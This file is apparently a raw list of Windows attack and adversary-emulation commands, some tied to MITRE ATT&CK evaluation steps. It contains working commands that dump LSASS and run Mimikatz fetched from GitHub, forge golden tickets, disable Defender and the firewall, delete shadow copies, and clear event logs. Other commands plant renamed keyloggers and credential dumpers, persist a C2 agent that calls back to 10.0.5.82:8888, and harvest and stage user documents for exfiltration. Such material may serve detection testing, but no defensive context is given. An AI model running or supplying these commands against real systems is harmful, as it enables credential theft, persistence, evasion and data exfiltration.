echo \"Test LLMNR Traffic\" | nc -w 1 $var=HOME_NET 5355
echo 'Simulated LLMNR Response'
echo malicious macro simulation > %TEMP%/macro.doc && start winword.exe %TEMP%/macro.doc && start cmd.exe
echo 'malicious macro simulation' > $env:TEMP\\macro.doc; Start-Process -FilePath 'winword.exe' -ArgumentList $env:TEMP\\macro.doc; Start-Process -FilePath 'powershell.exe'
rundll32.exe C:\\\\Windows\\\\System32\\\\<malicious.sys>,EntryPoint
certutil.exe -urlcache -split -f https://example.com/test.txt\ncertutil.exe -encode input.txt output.txt\ncertutil.exe -decode input.txt output.txt\ncertutil.exe -decodehex input.txt output.txt\ncertutil.exe -exportPFX -p password CertStoreName CertId output.pfx
svchost.exe /C start excel.exe\nsvchost.exe /C start winword.exe
ssh -D 8080 -f -C -q -N user@example.com
ssh.exe -l user -L 3389:localhost:3389 target_system
cd C:\\Windows\\System32\nconhost.exe /../../
echo '' > CATClean.exe\necho '' > CleanWipe.exe
netsh advfirewall reset
echo Set objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\") > temp.vbs\necho Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\") >> temp.vbs\necho Set objConfig = objStartup.SpawnInstance_ >> temp.vbs\necho Set objProcess = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2:Win32_Process\") >> temp.vbs\necho objProcess.Create \"cscript.exe /shell\", null, objConfig, intProcessID >> temp.vbs\ncscript.exe temp.vbs
nltest /all_trusts \nnltest /domain_trusts
sqlcmd -S <server_name> -d <database_name> -U <username> -P <password> -Q \"SELECT * FROM <table_name> WHERE DEVICE_TYPE = 43 AND DEVICE_ID NOT IN (144116289097433088/40,144116290338947072/40,144116287637815296/40)\"
net user TestUser abcd1234! /add
net user TestAccount /active:no
net user <username> /delete
net localgroup \"TestGroup\" /add
hashcat.exe -m 0 -a 0 -o cracked.txt hash.txt wordlist.txt
attrib.exe +h C:\\\\path\\\\to\\\\file
C:\\path\\to\\procdump.exe -ma lsass.exe C:\\path\\to\\output.dmp
sc.exe query WinDefend\nsc.exe stop WinDefend\nsc.exe config WinDefend start= disabled
echo SGVsbG8gd29ybGQ= > temp.b64\ncertutil -decode temp.b64 temp.txt
certutil.exe -decode input.cer output.pfx
certutil.exe -VerifyCtl -split -f http://example.com/payload.bin payload.bin
certutil.exe -urlcache -split -f \"http://example.com/file.txt\" C:\\\\path\\\\to\\\\file.txt
findstr /s \"password\" C:\\*\nfindstr /s \"pswd\" C:\\*\nfindstr /s \"secret\" C:\\*
netsh advfirewall set allprofiles state off
net localgroup administrators TestUser /delete
net user /add test Ahmet1453!
net localgroup administrators test /add
net localgroup Administrators test /delete
netsh advfirewall show allprofiles
net view
arp -a
route print
echo 'Description|12622590293378144023[/groups,/priv]' > CUST_4259873.txt\nstart excel.exe /e\necho 'Target_Process_Name|10814778825021535730[excel.exe]' > CUST_4259878.txt\necho 'Description|12622590293378144023[Dataexchange.dll]' > CUST_4259873.txt
wmic path win32_useraccount where Name='TargetUsername' set PasswordExpires=false
vssadmin delete shadows /all /quiet
wevtutil cl System\nwevtutil cl Security\nwevtutil cl Application
echo Y | chkdisk C: /f\necho Y | chkdisk D: /f
iisreset /start\nappcmd set site /site.name:\"Default Web Site\" /+bindings.[protocol='http',bindingInformation='*:80:localhost']\nappcmd set config  /section:system.webServer/httpLogging /dontLog:True /commit:apphost
echo 'http://suspicious-url.com' > C:\\Users\\Public\\URL|10814778825021535730[$$Suspicious URL$$]
type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\ntype C:\\\\Users\\\\Administrator\\\\.bash_history\necho %username% | type C:\\\\Windows\\\\System32\\\\config\\\\SAM
ping -n 1 $var=HONEYPOT_SERVER\nnetstat -ano | findstr :$var=HONEYPOT_SERVER_PORT
curl http://example.com:80\ncurl https://example.com:443
for /L %i in (1,1,1000) do (net use \\\\nonexistent_server%i /user:nonexistent_user%i nonexistent_password%i)
netsh wlan show networks
echo \"echo Hello World\" > 10814778825021535730.bat && start /B 10814778825021535730.bat
schtasks /create /tn \"TestTask\" /tr \"C:\\Windows\\System32\\notepad.exe\" /sc daily
psexec.exe \\\\target cmd
echo %ProgramFiles%\\Antivirus\\sigcheck.exe -i %windir%\\system32\\malware.exe
wevtutil cl System\nwevtutil cl Security
runas /user:administrator \"cmd /c echo 'fail'\"
net localgroup \"GroupName\" /delete
netstat -a -n -o | findstr \"<IP Address of Unauthorized Client>\"
echo \"Creating high CPU and RAM usage\"\npowershell -Command \"$result=1; $num1=1; $num2=1; for($i=0; $i -le 1000000; $i++){$result=$num1+$num2; $num1=$num2; $num2=$result;}\"\nfsutil file createnew C:\\largefile.txt 1073741824
dir /s *.bak\ndir /s *.ova\ndir /s *.bkf\ndir /s *.img
netsh advfirewall firewall add rule name=\"OpenPort\" dir=in action=allow protocol=TCP localport=4242
reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"malware\" /t REG_SZ /d \"cmd /c echo malware\"

net user /domain
net user %USERNAME% /domain
net user /domain
12011c_AdFind.exe -sc admincountdmp
12011c_AdFind.exe -sc exchaddresses
12011c_AdFind.exe -f (objectcategory=person)
12011c_AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
Invoke-Expression $env:TEMP\ADRecon.ps1
"" -f (objectcategory=person) > ad_users.txt
([adsisearcher]"objectcategory=user").FindAll();
([adsisearcher]"objectcategory=user").FindOne()
Try {; Import-Module ActiveDirectory -ErrorAction Stop |
Out-Null; ; }; Catch {; if((Get-CimInstance -ClassName
Win32_OperatingSystem).ProductType -eq 1) {;
Add-WindowsCapability -Name (Get-WindowsCapability
-Name RSAT.ActiveDirectory.DS* -Online).Name
-Online; } else {; Install-WindowsFeature
RSAT-AD-PowerShell; }; }; ; Get-ADObject -LDAPFilter
'(UserAccountControl:1.2.840.113556.1.4.803:=524288)'
-Server $env:UserDnsDomain
net user administrator /domain
query user /SERVER:%COMPUTERNAME%
cd $env:temp; .\kerbrute.exe userenum -d
$env:USERDOMAIN --dc $env:UserDnsDomain
$env:TEMP\username.txt
Import-Module .\powerview.ps1;Get-DomainComputer
Import-Module .\invoke-mimi.ps1;Invoke-Mimikatz
-DumpCreds
nbtstat -n
whoami.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion" /v ProductName ® query
"HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion" /v CurrentMajorVersionNumber ® query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentMinorVersionNumber ® query "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion" /v CurrentBuild
dir /s /b C:\ > dir.out
netstat -ano | findstr 3389
move .\dumpWebBrowserCreds.exe C:\Windows\System32\oradump.exe
C:\Windows\System32\oradump.exe 2>&1
move .\keylogger.exe C:\Windows\System32\mslog.exe
exec-background cmd.exe /k "C:\Windows\System32\mslog.exe -o
C:\Windows\System32\mslog.txt"
dir C:\Windows\System32\mslog.txt
dsquery.exe computer -s 10.0.5.1 -u -p 12345679898789
dsquery.exe computer -s 10.0.5.1 -u -p
dsquery.exe computer -s -u -p 12345679898789
dsquery.exe computer -s -u -p
del /Q C:\Windows\System32\oradump.exe
C:\Windows\System32\mslog.exe
C:\Windows\System32\mslog.txt
copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat;dir
C:\Windows\perfc.dat;
rundll32.exe C:\Windows\perfc.dat,"#1"
Sleep 3;$bin = Get-ChildItem *cod*scr*;$arguments =
'-server "http://10.0.5.82:8888" -group
"rtlo_group"';start-process -WindowStyle Hidden
$bin.FullName.toString() -ArgumentList $arguments;if ($?) { write-host "Successfully completed RTLO execution. A new agent should appear"; exit 0;} else { write-host "Failure of RTLO execution."; exit 1;}
powershell.exe;if ($?) { write-host "[*] PowerShell successfully spawned"; exit 0;}
$env:APPDATA;$files=ChildItem -Path
$env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pp s,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx, *.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*a dmin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty
FullName; Compress-Archive -LiteralPath $files
-CompressionLevel Optimal -DestinationPath
$env:APPDATA\Draft.Zip -Force
ipconfig /all
echo %USERDOMAIN%\%USERNAME%
[System.Net.ServicePointManager]::ServerCertificateVali dationCallback = { $True };$web = (New-Object
System.Net.WebClient);$result = $web.DownloadString(" https://raw.githubusercontent.com/EmpireProject/Empire/ master/data/module_source/credentials/Invoke-Mimikatz.
ps1");iex $result;function hashdump{ Invoke-Mimikatz
-Command "privilege::debug token::elevate lsadump::sam exit"};hashdump;
Import-Module .\StealToken.ps1 -Verbose
-Force;StealToken;CreateProcessWithToken
-CommandLine 'cmd.exe /c reg query
"\\\hklm\system\currentcontrolset\control\terminal server"';CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update
Checker" /tr ".\sandcat.exe http://10.0.5.82:8888 evals"
/sc ONLOGON /RU SYSTEM';CreateProcessWithToken
-CommandLine 'cmd.exe /c dir /s /b
';CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';RevertToSelf;
if (! $(test-path -path "C:\Program
Files\SysinternalsSuite")) { write-host "[!] The path
C:\Program Files\SysinternalsSuite does not exist.
Execution has stopped."; exit 1;}Set-Location -path
"C:\Program Files\SysinternalsSuite";./accesschk.exe
-accepteula .;
Import-Module .\StealToken.ps1 -Verbose
-Force;StealToken;CreateProcessWithToken
-CommandLine 'cmd.exe /c reg query
"\\\hklm\system\currentcontrolset\control\terminal server"';CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update
Checker" /tr ".\sandcat.exe http://10.0.5.82:8888 evals"
/sc ONLOGON /RU SYSTEM';CreateProcessWithToken
-CommandLine 'cmd.exe /c dir /s /b
';CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';RevertToSelf;
Import-PfxCertificate -Exportable -FilePath
".\dmevals.local.pfx" -CertStoreLocation
Cert:\LocalMachine\My;if (! $(test-path -path "C:\Program
Files\SysinternalsSuite")) { write-host "[!] The path
C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."; exit 1;}Set-Location -path "C:\Program Files\SysinternalsSuite";.
.\readme.ps1;Get-PrivateKeys;if ($? -eq $True) { write-host "[+] Successfully executed private key collection script."; exit 0;} else { write-host "[!] Error, could not execution Get-PrivateKeys."; exit 1;}
$clip_data=get-clipboard;if ($clip_data.Length -gt 0) { write-host "[+] Clipboard data obtained!\n"; write-host $clip_data;} else { write-host "[!] No clipboard data available!\n";}
if (! $(test-path -path "C:\Program
Files\SysinternalsSuite")) { write-host "[!] The path
C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."; exit 1;}Set-Location -path "C:\Program Files\SysinternalsSuite";.
.\psversion.ps1;Get-Keystrokes;Start-Sleep -Seconds
15;View-Job -JobName "Keystrokes";
Import-Module .\StealToken.ps1 -Verbose
-Force;StealToken;CreateProcessWithToken
-CommandLine 'cmd.exe /c reg query
"\\\hklm\system\currentcontrolset\control\terminal server"';CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update
Checker" /tr ".\sandcat.exe http://10.0.5.82:8888 evals"
/sc ONLOGON /RU SYSTEM';CreateProcessWithToken
-CommandLine 'cmd.exe /c dir /s /b
';CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';RevertToSelf;
if (! $(test-path -path "C:\Program
Files\SysinternalsSuite")) { write-host "[!] The path
C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."; exit 1;}Set-Location -path "C:\Program Files\SysinternalsSuite";.
.\psversion.ps1;Ad-Search Computer Name *;
Import-Module .\Get-Screenshot.ps1 -Verbose
-Force;Get-Screenshot;
ls
. .\stepThirteen.ps1;comp;
. .\stepFourteen_bypassUAC.ps1;bypass;
. .\stepFourteen_credDump.ps1;
write-host "[+] Successfully downloaded m.exe";
. .\stepSeventeen_email.ps1;Write-Host "Emails
Collected";
try{ if (!(test-path -path
"C:\Windows\Temp\WindowsParentalControlMigration"
-ErrorAction Stop)) { New-Item -Path "C:\Windows\temp\"
-Name "WindowsParentalControlMigration" -ItemType
"directory" -force; }} catch { write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via
Explorer and accept prompt"; exit 1;}if (! (test-path -path
"C:\Users\\Documents\MITRE-ATTACK-EVALS.HTML")) { write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found."; exit 1;}Copy-Item
"C:\Users\\Documents\MITRE-ATTACK-EVALS.HTML"
-Destination
"C:\Windows\Temp\WindowsParentalControlMigration"
-force;. .\stepSeventeen_zip.ps1;zip C:\Windows\Temp\
WindowsParentalControlMigration.tmp
C:\Windows\Temp\WindowsParentalControlMigration;if ($?) { write-host "[+] Documents successfully staged for collection.";}
$err = $(net use y: /user: "" 2>&1);if($err -Like "*System error 85*") { Write-Host "OneDrive net drive is already mounted!";} elseif($err -Like "*System error 67*") { Write-Host "OneDrive net drive mount failed - Check URL!"; Write-Host ""; exit 1;} elseif($err -Like "*System error 1244*") { Write-Host "Could not authenticate to OneDrive - Check Creds!"; Write-Host "User: ";
Write-Host "Password: "; exit 1;}Write-Host "Mount Successful"Copy-Item "C:\Windows\Temp\WindowsPare ntalControlMigration.tmp" -Destination
"y:\WindowsParentalControlMigration.tmp" -Force;if(!$?){ exit 1;}Write-Host "Copy Successfull"exit 0;
klist purge;. .\Invoke-Mimikatz.ps1;invoke-mimikatz
-command "kerberos::golden /domain:maysanmando
/sid: /rc4: /user: /ptt";klist;invoke-command
-ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
klist purge;. .\Invoke-Mimikatz.ps1;invoke-mimikatz -command "kerberos::golden /domain: /sid: /rc4: /user:
/ptt";klist;invoke-command -ComputerName scranton
-ScriptBlock {net user /add toby "pamBeesly<3"};
$owners = @{};gwmi win32_process |%
{$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l="Owner";e={$o wners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And
$p.ProcessName -eq "svchost") {$p} };$valid |
ConvertTo-Json
Get-SmbShare | ConvertTo-Json
[System.Net.ServicePointManager]::ServerCertificateVali dationCallback = { $True };$web = (New-Object
System.Net.WebClient);$result = $web.DownloadString(" https://raw.githubusercontent.com/PowerShellMafia/Pow erSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3
/Exfiltration/Invoke-Mimikatz.ps1");iex $result;
Invoke-Mimikatz -DumpCreds
nslookup 10.0.5.81
nslookup
taskkill /F /IM mslog.exe
"\\mimikatz.exe" ""
"\secretsdump.exe" ""/"":""@""
"\psexec.exe" "":""@"" ""
copy "C:\$Recycle.Bin\"
if (Test-Path "C:\README.txt") { rm C:\README.txt
};schtasks /delete /tn Restart /F;
if (Test-Path "C:\Windows\perfc.dat") { rm
C:\Windows\perfc.dat };
del dir.out
Remove-Item $env:TEMP\ADRecon.ps1 -Force
-ErrorAction Ignore | Out-Null; Get-ChildItem $env:TEMP
-Recurse -Force | Where{$_.Name -Match
"^ADRecon-Report-"} | Remove-Item -Force -Recurse
Start-Process 'Taskmgr.exe' -ArgumentList '/dump lsass.exe'
Start-Process 'lsass.exe' -ArgumentList '/fake_path'
Start-Process 'whoami.exe' -ArgumentList '/all'
Start-Process 'netstat.exe' -ArgumentList '-ano'
Start-Process 'qprocess.exe'
Start-Process 'powershell.exe' -ArgumentList 'pwsh.exe'
Start-Process 'crackmapexec.exe'
Start-Process 'powershell.exe' -ArgumentList 'DataExchange.dll'
Start-Process 'regedit.exe' -ArgumentList 'nmap'
Start-Process 'whoami.exe' -ArgumentList '/priv /groups'
Start-Process 'net.exe' -ArgumentList 'user'
Start-Process 'whoami.exe' -ArgumentList '/all' -NoNewWindow
Start-Process 'WMIC.exe' -ArgumentList 'useraccount get name,sid'
Start-Process 'net.exe' -ArgumentList 'user administrator'
Start-Process 'net.exe' -ArgumentList 'localgroup administrators'
Start-Process 'ROUTE.EXE' -ArgumentList 'print'
Start-Process 'ARP.EXE' -ArgumentList '-a'
Start-Process 'net.exe' -ArgumentList 'share'
Start-Process 'netsh.exe' -ArgumentList 'firewall show state'
Start-Process 'netsh.exe' -ArgumentList 'firewall set opmode disable'
Start-Process 'findstr.exe' -ArgumentList 'password'
Start-Process 'vssadmin.exe' -ArgumentList 'list shadows'
Start-Process 'zenmap.exe'
Start-Process 'procdump.exe'
Start-Process 'certutil.exe' -ArgumentList 'urlcache split'
Start-Process 'schtasks.exe' -ArgumentList 'create'
Start-Process 'hashcat.exe' -ArgumentList '-a 0 -m 1000'
Start-Process 'nltest.exe' -ArgumentList 'domain_trusts'
Start-Process 'rundll32.exe' -ArgumentList 'MyStart.dll'
Start-Process 'cmd.exe' -ArgumentList '/c msi file download'
Start-Process 'RemoteDiskX'
Start-Process 'isoburn.exe'
Start-Process 'SepRemovalToolNative'
Start-Process 'conhost.exe' -ArgumentList '/../../'
Start-Process 'fgexec'
Start-Process 'cmd.exe' -ArgumentList 'base64 --decode'
Start-Process 'schtasks.exe' -ArgumentList 'create SYSTEM'
Start-Process 'browser.exe' -ArgumentList 'suspicious_url'
Start-Process 'net.exe' -ArgumentList 'user'
Start-Process 'cmd.exe' -ArgumentList '/../../'
Start-Process 'rundll32.exe' -ArgumentList 'dll,StartW'
Start-Process 'dsacls.exe' -ArgumentList '/user /passwd'
Start-Process 'winword.exe' -ArgumentList 'kerberos.dll'
Start-Process 'ntdsutil.exe'
Start-Process 'powershell.exe' -ArgumentList 'new-object system.net.sockets.tcpclient'
Start-Process 'SpoolFool.exe'
Start-Process 'SpoolFool.exe' -ArgumentList 'AddUser.dll'
Start-Process 'tscon.exe' -ArgumentList '/dest rdp-tcp'
Start-Process 'rundll32.exe' -ArgumentList '.sys'
Start-Process 'certutil.exe' -ArgumentList 'decode'
Start-Process 'ssh.exe' -ArgumentList '-R'
Start-Process 'ssh.exe' -ArgumentList '3389'
Start-Process 'MpCmdRun.exe' -ArgumentList 'DownloadFile url'
Start-Process 'WMIC.exe' -ArgumentList 'startmode pathname displayname name'
Start-Process 'wusa.exe' -ArgumentList 'extract'
Start-Process 'NSudo.exe'
Start-Process 'RunXcmd.exe' -ArgumentList '/account /exec'
Start-Process 'accesschk.exe'
Start-Process 'cmd.exe' -ArgumentList '/c \Windows\Caches\NavShExt.dll'
Start-Process 'cutil.exe' -ArgumentList '.txt /i scrobj.dll %APPDATA%'
Start-Process 'cmd.exe' -ArgumentList 'add reg scecli\0* HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
Start-Process 'iodine.exe'
Start-Process 'accesschk.exe' -ArgumentList 'hklm\system\current\controlset\services kwsu'
Start-Process 'reg.exe' -ArgumentList 'add hklm\system\currentcontrolset\control\lsa DisableRestrictedAdmin REG_DWORD /d 0'
Start-Process 'schtasks.exe' -ArgumentList '/delete Windows Defender Scheduled Scan'
Start-Process 'ls.exe' -ArgumentList '-oN -output'
